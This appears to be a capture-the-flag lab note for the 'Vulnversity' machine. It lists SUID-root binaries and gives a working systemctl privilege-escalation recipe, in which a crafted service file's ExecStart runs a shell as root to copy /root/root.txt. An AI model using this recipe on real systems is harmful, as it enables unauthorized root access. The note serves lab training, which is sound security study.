# Machine : Vulnversity
# TITLE :  PrivilegeList

## command : find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap <br>
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn <br>
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap <br>
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo <br>
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh <br>
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd <br>
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec <br>
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp <br>
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd <br>
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/ snap-confine <br>
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/ policykit-1/polkit-agent-helper-1 <br>
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign <br>
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device <br>
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger <br>
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper <br>
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic <br>
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su <br>
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g <br>
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount <br>
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6 <br>
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount <br>
***-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl*** <br>
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping <br>
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount <br>
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs <br>

# GTFObin "/bin/systemctl" privilege escalte command     
  &nbsp; TF=$(mktemp).service <br>
  &nbsp; echo '[Service] <br>

  &nbsp; Type=oneshot <br>
  &nbsp; ExecStart=/bin/sh -c "cat /root/root.txt >> /tmp/output.txt" <br>
  &nbsp; [Install] <br>
  &nbsp; WantedBy=multi -user.target' > $TF <br>
  
  &nbsp; /bin/systemctl link $TF <br>
  &nbsp; /bin/systemctl enable --now  $TF <br>

  <p>ExecStart를 이용해 명령어 관리자 권한으로 수행되는 명령어를 실행할 수 있음</p>